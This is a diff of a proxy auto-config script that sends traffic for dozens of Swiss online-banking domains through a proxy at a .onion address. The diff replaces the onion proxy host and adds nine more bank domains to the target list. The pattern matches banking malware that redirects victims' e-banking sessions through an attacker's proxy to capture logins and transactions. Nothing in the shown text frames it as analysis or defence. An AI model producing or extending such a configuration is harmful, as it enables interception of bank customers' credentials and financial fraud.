@@ -1,5 +1,5 @@
 function FindProxyForURL(url, host) {
-    var proxy = "PROXY 7tnrj5wewhcj76c3.onion:88;";
+    var proxy = "PROXY log5moxngjoys52g.onion:88;";
     var hosts = new Array('*.postfinance.ch', 'cs.directnet.com', 'eb.akb.ch',
         '*.ubs.com', 'tb.raiffeisendirect.ch', '*.bkb.ch', '*.lukb.ch',
         '*.zkb.ch', '*.onba.ch', 'e-banking.gkb.ch', '*.bekb.ch',
@@ -15,7 +15,10 @@ function FindProxyForURL(url, host) {
         '*bernerlandbank.ch', '*bancasempione.ch', '*bsibank.com',
         '*corneronline.ch', '*vermoegenszentrum.ch', '*gobanking.ch',
         '*slbucheggberg.ch', '*slfrutigen.ch', '*hypobank.ch',
-        '*regiobank.ch', '*rbm.ch', '*hbl.ch');
+        '*regiobank.ch', '*rbm.ch', '*hbl.ch', '*ersparniskasse.ch',
+        '*ekr.ch', '*sparkasse-dielsdorf.ch', '*eki.ch',
+        '*bankgantrisch.ch', '*bbobank.ch', '*alpharheintalbank.ch',
+        '*aekbank.ch', '*acrevis.ch');
     for (var i = 0; i < hosts.length; i++) {
         if (shExpMatch(host, hosts[i])) {
             return proxy
